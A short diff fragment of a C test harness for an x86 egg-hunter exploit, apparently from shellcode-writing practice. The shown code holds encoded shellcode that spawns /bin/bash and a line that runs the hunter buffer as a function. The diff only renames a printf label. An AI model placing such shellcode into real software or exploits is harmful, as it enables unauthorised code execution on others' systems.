@@ -8,7 +8,7 @@ char shell_code_with_egg[] = \
 "\x6a\x61\x76\x69\x74\x65\x6a\x65\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80";
 
 int main(){
-	printf("Shellcode Length:  %d\n", strlen(hunter));
+	printf("Egg Hunter Length:  %d\n", strlen(hunter));
      	(*(void  (*)()) hunter)();
      	return 0;
 }
